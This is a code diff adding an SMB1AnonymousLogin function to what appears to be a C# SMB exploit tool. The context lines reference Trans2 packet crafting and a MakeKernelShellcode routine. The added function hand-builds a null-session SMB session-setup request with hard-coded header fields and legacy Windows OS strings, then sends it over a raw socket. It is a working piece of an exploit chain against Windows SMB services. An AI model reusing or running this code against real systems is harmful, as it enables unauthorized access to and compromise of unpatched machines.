@@ -121,6 +121,57 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
 
           return pkt;
       }
+    
+    
+    static public byte[] SMB1AnonymousLogin(Socket sock)
+        {
+
+            SMB_HEADER header = new SMB_HEADER
+            {
+                protocol = 0x424d53ff,
+                command = 0x73,
+                errorClass = 0x00,
+                _reserved = 0x00,
+                errorCode = 0x0000,
+                flags = 0x18,
+                flags2 = 0xc007,
+                PIDHigh = 0x0000,
+                SecurityFeatures = 0x0000000000000000,
+                reserved = 0x0000,
+                TID = 0xfeff,
+                PIDLow = 0x0000,
+                UID = 0x0000,
+                MID = 0x0040
+            };
+            byte[] headerBytes = GetBytes(header);
+
+            SMB_COM_SESSION_SETUP_ANDX_REQUEST AndxRequest = new SMB_COM_SESSION_SETUP_ANDX_REQUEST
+            {
+                WordCount = 0x0d,
+                AndxCommand = 0xff,
+                reserved1 = 0x00,
+                AndxOffset = 0x0088,
+                MaxBuffer = 0x1104,
+                MaxMpxCount = 0x00a0,
+                VcNumber = 0x0000,
+                SessionKey = 0x00000000,
+                OEMPasswordLen = 0x0001,
+                UnicodePasswordLen = 0x0000,
+                Reserved2 = 0x00000000,
+                Capabilities = 0x000000d4
+            };
+            List<byte> SMBData = new List<byte>();
+            byte[] nulls = { 0x00, 0x00, 0x00, 0x00, 0x00 };
+            SMBData.AddRange(nulls);
+            SMBData.AddRange(Encoding.UTF8.GetBytes("W\0i\0n\0d\0o\0w\0s\0 \02\00\00\00\0 \02\01\09\05\0\0\0"));
+            SMBData.AddRange(Encoding.UTF8.GetBytes("W\0i\0n\0d\0o\0w\0s\0 \02\00\00\00\0 \05\0.\00\0\0\0"));
+            AndxRequest.ByteCount = (ushort)SMBData.Count;
+
+            byte[] AndxRequestBytes = GetBytes(AndxRequest).Concat(SMBData.ToArray()).ToArray();
+            byte[] pkt = headerBytes.Concat(AndxRequestBytes).ToArray();
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
+        }
 
 static public byte[] MakeKernelShellcode()
         {
